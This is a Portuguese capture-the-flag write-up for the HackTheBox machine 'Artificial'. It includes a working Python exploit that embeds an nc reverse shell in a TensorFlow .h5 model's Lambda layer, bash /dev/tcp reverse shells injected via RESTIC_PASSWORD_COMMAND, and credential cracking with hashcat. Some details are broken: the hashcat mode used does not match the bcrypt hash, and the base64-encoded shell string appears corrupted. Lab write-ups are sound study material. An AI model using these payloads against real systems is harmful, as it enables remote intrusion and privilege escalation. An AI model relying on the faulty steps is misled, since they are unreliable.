# HackTheBox - Artificial (Write-up)

Este é um write-up detalhado da máquina **Artificial** no HackTheBox.  
O objetivo foi explorar vulnerabilidades em modelos TensorFlow maliciosos para obter execução remota de código, escalar privilégios e capturar as flags de `user.txt` e `root.txt`.

---

## 📌 Sumário
- [Reconhecimento](#-reconhecimento)
- [Acesso Inicial](#-acesso-inicial)
- [Exploração do TensorFlow](#-exploração-do-tensorflow)
- [Acesso ao Contêiner](#-acesso-ao-contêiner)
- [Escalada de Privilégios](#-escalada-de-privilégios)
- [Flags](#-flags)
- [Conclusão](#-conclusão)

---

## 🔎 Reconhecimento

Utilizando o **nmap** para identificar portas abertas:

```bash
nmap -sCVT 10.10.11.74
```

Resultado:

```
PORT   STATE SERVICE VERSION
22/tcp open ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open http    nginx 1.18.0 (Ubuntu)
```

- Serviço HTTP redirecionava para `http://artificial.htb/`.

---

## 🔑 Acesso Inicial

Foi possível criar uma conta demo para explorar a aplicação.  
O sistema permitia upload de arquivos `.h5` (modelos TensorFlow).

Descoberta: vulnerabilidade de execução remota de código (RCE) no carregamento de modelos TensorFlow.

---

## 💥 Exploração do TensorFlow

Exploit em Python para criar um `.h5` malicioso:

```python
import tensorflow as tf
import os

def exploit(x):
    os.system("rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.xx.xx 4444 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

Criação do contêiner para compilar o modelo malicioso:

```bash
docker run -it --rm -v "$PWD":/app -w /app tensorflow/tensorflow:2.13.0 python3 exploit.py
```

Upload do `exploit.h5` no Web UI → **View Predictions** → Reverse shell obtida.

---

## 🖥️ Acesso ao Contêiner

Após o upload, abrir shell interativa:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Agora, acesso inicial garantido no contêiner.

---

## 🚀 Escalada de Privilégios

Foi encontrado arquivo `config.json` dentro de `.config/backrest/`:

```bash
cat .config/backrest/config.json
```

Credenciais (bcrypt):

```
"user": "backrest_root",
"passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
```

Bruteforce da senha via hashcat:

```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Exploração com variável de ambiente `RESTIC_PASSWORD_COMMAND` para reverse shell persistente:

```bash
echo "bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1" | base64
```

Uso no ENV:

```bash
RESTIC_PASSWORD_COMMAND=echo "YmFzaCAtaSA+JiAvZGVzxL3RjcC8xMC4xMC4xNi4xMzUvNDQ0NCAwPiYxCg==" | base64 -d | bash
```

Para persistência de longo prazo:

```bash
RESTIC_PASSWORD_COMMAND=bash -c 'bash -i >& /dev/tcp/10.10.xx.xxx/4444 0>&1'
```

---

## 🏁 Flags

Após acesso root:

```bash
cat /home/user/user.txt
cat /root/root.txt
```

---

## ✅ Conclusão

A máquina **Artificial** explorou falhas críticas em Machine Learning:

1. **Nmap** revelou SSH e HTTP.  
2. **TensorFlow RCE** via upload de modelo `.h5`.  
3. **Reverse shell** através de código malicioso embutido no modelo.  
4. **Config.json** com credenciais expostas.  
5. **PrivEsc** via variável `RESTIC_PASSWORD_COMMAND`.  
6. Flags capturadas com sucesso.  

```
Status: PWNED 🏴‍☠️
```
